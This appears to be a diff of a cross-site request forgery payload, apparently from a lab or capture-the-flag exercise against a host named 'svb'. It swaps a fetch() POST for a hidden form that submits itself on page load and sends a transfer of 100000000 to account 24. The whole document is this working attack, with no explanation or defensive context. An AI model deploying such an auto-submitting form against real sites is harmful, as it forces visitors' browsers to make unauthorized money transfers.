@@ -1,9 +1,8 @@
 <script>
-    fetch("http://svb:5003/transfer/1", {
-        method: "POST",
-        body: JSON.stringify({
-            amount: 100000000,
-            account: 24
-        })
-    });
+    document.getElementById('1').submit();
 </script>
+
+<form id=1 action="http://svb:5003/transfer/1" method="POST">
+    <input type="hidden" name="account" value="24" />
+    <input type="hidden" name="amount" value="100000000" />
+</form>
